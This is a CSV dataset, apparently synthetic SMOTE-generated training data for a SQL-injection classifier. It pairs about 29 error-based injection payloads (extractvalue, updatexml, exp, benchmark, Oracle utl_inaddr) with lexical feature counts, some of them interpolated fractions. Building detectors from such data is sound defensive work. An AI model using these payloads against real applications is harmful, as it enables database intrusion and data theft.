id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000058,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'kwhs' like 'kwhs",nearest_attack_euclidean,R000014,1.798217887980425,183.113448906215,30.202445255675457,3.625997390714721,52.25916970878296,32.0,75.20244525567546,23.651833941756593,0.2839537699096575,0.17538919598221736,0.41151823678352895,0.12913879732459616,2.6518339417565926,0.0,0.0,0.0,1.0,1.0,0.0,14.0,2.7755575615628914e-17,0.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.550611313918864,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.550611313918864
SMOTE_000059,attack,error,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000292,0.6474264041652761,170.04173570895344,31.61859505453488,3.8841735277778167,44.567355490813924,44.52561978186048,59.948760436279045,21.0,0.26149149548016476,0.26265216318661677,0.3521835529694803,0.12367278836373818,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.61859505453488,2.7755575615628914e-17,0.0,5.381404945465119,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000060,attack,error,"1 where 6369  =  6369 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000142,0.309458403922643,166.44339236910656,32.711321526178686,3.8783239697055003,54.0,32.0,61.15471389528525,19.28867847382131,0.32449400399530287,0.19229274310832764,0.36734132800626285,0.11587192489010667,0.0,0.0,2.0,0.0,0.0,1.0,0.0,12.288678473821312,2.7755575615628914e-17,0.0,4.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000061,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000108,0.2431602677819646,161.9013606418325,32.901360641832504,3.664359219710332,50.0,23.0,68.0,20.901360641832504,0.3088310700064556,0.14206229220296956,0.4200102552087796,0.1290963825817952,0.0,0.901360641832504,0.0,0.0,0.0,0.0,0.0,15.0,2.7755575615628914e-17,0.0,4.0,0.0,0.0,0.901360641832504,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000062,attack,error,"1"" where 5334  =  5334 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000043,0.07020793569024059,192.0,32.98019067596463,3.689840063092374,48.01980932403537,40.0,79.0,24.98019067596463,0.2501031735626842,0.20833333333333334,0.4114583333333333,0.13010515977064913,0.0,0.9801906759646288,2.0,0.0,1.0,2.0,0.0,14.0,2.7755575615628914e-17,0.0,4.0,5.0,0.0,0.9801906759646288,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.019809324035371167,0.9801906759646288,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000063,attack,error,"1%""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000252,0.019513253279850647,168.8900562446308,31.0,3.683993793290237,52.0,24.0,67.91204499570466,24.978011248926165,0.3079050677414014,0.1421100312652622,0.4020919124572659,0.14789298853607052,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,13.978011248926165,2.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000064,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",nearest_attack_euclidean,R000071,0.011110571679623198,161.0,28.990102252800693,3.8494095084814886,47.970306758402074,35.03959098879724,56.980204505601385,21.009897747199307,0.2979522158906961,0.21763721111054182,0.3539143136993875,0.13049625929937458,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,10.0,2.7755575615628914e-17,0.0,5.009897747199308,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000065,attack,error,"1'   )    )    as ewsw where 4667  =  4667 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000196,0.47540857841484624,182.42562211696838,35.367768269004515,3.9030277091957584,61.0,31.0,69.79339038597288,20.632231730995482,0.33449854390722533,0.1699910632971145,0.38242127023939454,0.11308912255626567,1.0,0.0,0.0,0.0,0.0,1.0,0.0,13.632231730995482,2.7755575615628914e-17,0.0,4.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000066,attack,error,"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000173,0.21004195991564795,164.00093783145738,31.190386873194534,3.819472210097407,60.85767876083278,23.90480656340273,60.33364594381913,18.904806563402733,0.37076512375354737,0.14591505532072607,0.3679405076425042,0.1153793132832224,1.0,0.0,0.0,0.0,0.0,0.0,0.0,12.904806563402733,2.7755575615628914e-17,0.0,4.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000067,attack,error,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'hofy' like 'hofy",nearest_attack_euclidean,R000202,1.3097649045533353,166.0,31.97555257159713,3.932327653196432,63.674815809467624,23.674815809467624,58.97555257159713,19.674815809467624,0.38358322776787723,0.1426193723461905,0.35527441308191043,0.11852298680402182,3.0244474284028695,0.0,0.0,0.0,0.0,0.0,0.0,12.325184190532378,2.7755575615628914e-17,0.0,4.0,0.0,1.0,0.0,0.0,0.3251841905323768,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.6748158094676232,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6748158094676233
SMOTE_000068,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000224,0.588843227490189,140.4705842213635,26.245097370227253,3.658505604981014,37.0,35.0,51.98038948090901,16.490194740454506,0.2634873919032275,0.2492448301787287,0.36994663073960865,0.11732114717843513,0.2450973702272523,0.0,0.0,0.0,0.0,1.0,0.0,10.245097370227253,2.7755575615628914e-17,0.0,5.0,1.0,0.2450973702272525,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000069,attack,error,"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000256,0.7117360755546166,172.6287860750677,32.58417468334838,3.8273417304189254,55.75252405004513,32.0,64.58417468334838,20.29208734167419,0.32277274533204126,0.18547087892204514,0.3742053035611203,0.11755107218479323,0.2920873416741887,0.0,2.0,0.0,0.0,1.0,0.0,13.0,2.7755575615628914e-17,0.0,4.0,3.0,0.2920873416741889,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000070,attack,error,"1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000106,1.2167505953941535,180.5778506720473,36.0,3.930728608977986,61.0,31.0,68.68338800403549,19.89446266801183,0.337967662513517,0.17175405799867258,0.38017472995447116,0.11010354953333928,0.0,0.44723133400591414,0.0,0.0,0.0,1.0,0.0,13.447231334005915,2.7755575615628914e-17,0.0,4.0,1.0,0.0,0.4472313340059142,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000071,attack,error,"1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000110,0.8222695668981972,140.33999033301131,28.019970999033912,3.558641404726399,56.0,12.0,59.0,13.339990333011304,0.3990354884169892,0.08550760466078339,0.4204123895821851,0.09504451734004234,0.33999033301130444,0.0,0.0,1.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,1.0,2.0,0.33999033301130466,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000072,attack,error,"1%""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000286,0.4432812273494495,160.43424160874045,34.0,3.7309074170119465,50.0,23.0,65.86186800728372,21.572373601456743,0.3119606679219509,0.1435019072440974,0.4101066938525533,0.1344307309813984,0.0,1.0,0.0,0.0,0.0,0.0,0.0,14.572373601456743,1.0,0.0,4.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000073,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000218,0.7231690051006422,140.21013498017885,24.697466254955287,3.588697419573518,36.0,35.0,52.21013498017886,17.0,0.25680108370043575,0.24966772026431253,0.3722640176211571,0.12126717841409465,0.6974662549552859,0.0,0.0,0.0,0.0,1.0,0.0,10.302533745044714,2.7755575615628914e-17,0.0,5.0,1.0,0.6974662549552857,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000074,attack,error,"1'||  (  select 'bpml' where 7360  =  7360 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000026,0.7343816892722496,187.28353086556885,32.283530865568856,3.898253568561009,51.283530865568856,43.0,66.0,27.0,0.2738241039286996,0.2295997318460729,0.35240889074048404,0.14416727348474345,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.7755575615628914e-17,0.0,5.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.28353086556885765,0.7164691344311424,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000075,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""eiuc"" like ""eiuc",nearest_attack_euclidean,R000063,0.6068003727648049,162.0,30.11834041327506,3.9330259571169472,50.88165958672494,36.49112055103341,54.25443972448329,20.372780137758355,0.3140843184365737,0.22525383056193463,0.33490394891656355,0.1257579020849281,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,5.372780137758353,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000076,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000003,0.7709001466696848,110.21035305149353,35.894823474253236,4.26193808634749,59.21035305149353,1.0,35.0,15.0,0.5370972226873487,0.009076525045346118,0.3176783765871136,0.13614787568019154,3.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,2.7755575615628914e-17,4.552588262873382,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000077,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'sqbr'  =  'sqbr",nearest_attack_euclidean,R000306,0.08911676004031209,185.0,29.263234215945726,3.6313049158319237,48.0,35.0,77.0,25.0,0.2594594594594595,0.1891891891891892,0.41621621621621624,0.13513513513513514,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,2.7755575615628914e-17,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000078,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",nearest_attack_euclidean,R000071,0.09490261122740479,161.0,28.91545691063127,3.850792654905,47.74637073189381,35.33817235747492,56.83091382126254,21.08454308936873,0.2965613088937504,0.21949175377313615,0.3529870423680903,0.13095989496502317,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,10.0,2.7755575615628914e-17,0.0,5.084543089368729,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000079,attack,error,select   (  case when   (  5322  =  6200  )   then 5322 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000122,0.0,133.0,28.0,3.717153974630355,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000080,attack,error,"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""stcv""  =  ""stcv",nearest_attack_euclidean,R000223,1.3316064942973294,172.76094712380942,30.3731754793651,3.7124343225918905,57.01459616507922,24.0,68.0,23.746350958730194,0.3297344886377109,0.13895984003477851,0.3937195467652057,0.1375861245623049,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,14.0,0.7463509587301946,0.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000081,attack,error,"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""ikhr""  =  ""ikhr",nearest_attack_euclidean,R000231,0.42088013855066914,165.1048227973458,30.89517720265421,3.8689230882530024,60.41929118938316,24.0,59.79035440530842,20.89517720265421,0.36593259139859347,0.14536269634405624,0.3621438155909143,0.12656089666643602,0.0,3.999999999999999,0.0,0.0,0.0,0.8951772026542097,0.0,12.0,2.7755575615628914e-17,0.0,4.0,0.8951772026542097,0.0,1.0,0.0,0.0,0.0,0.8951772026542097,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000082,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000064,0.05838802031677103,171.03015476227122,30.0,3.79230085956669,48.12061904908489,35.0,64.93969047545755,22.969845237728777,0.2813538157488269,0.20464247869306768,0.37969968080224437,0.13430402475586095,0.0,3.999999999999999,0.0,0.0,0.0,1.9698452377287778,0.0,12.0,2.7755575615628914e-17,0.0,5.0,1.9698452377287778,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000083,attack,error,"1'   )    )    as ewsw where 4667  =  4667 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000196,0.47870471482101806,182.40777325801048,35.37031810599851,3.9032838548934667,61.0,31.0,69.77809136400897,20.629681894001497,0.3345316073872263,0.17000786604924614,0.3823743464246859,0.1130861801388417,1.0,0.0,0.0,0.0,0.0,1.0,0.0,13.629681894001495,2.7755575615628914e-17,0.0,4.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000084,attack,error,"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'zjnp'  =  'zjnp",nearest_attack_euclidean,R000247,0.2052490837319694,184.0,28.0,3.6127881304781133,44.59132213036916,38.211570492841126,75.39421475357943,25.80289262321028,0.24234414201287585,0.2076715787654409,0.40975116713901866,0.14023311208266456,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,2.7755575615628914e-17,0.0,5.8028926232102815,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000085,attack,error,"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""onsd"" like ""onsd",nearest_attack_euclidean,R000127,1.7019528996850293,165.57611812115888,30.423881878841126,3.881987162950407,62.3044724846355,24.0,58.84776375768225,20.423881878841126,0.3762566948775219,0.14494973220489912,0.35543314832961076,0.12336042458796821,0.0,3.999999999999999,0.0,0.0,0.0,0.4238818788411254,0.0,12.0,2.7755575615628914e-17,0.0,4.0,0.42388187884112516,0.0,1.0,0.0,0.0,0.0,0.4238818788411253,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000086,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000022,0.0,133.0,29.0,3.7536558766775228,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
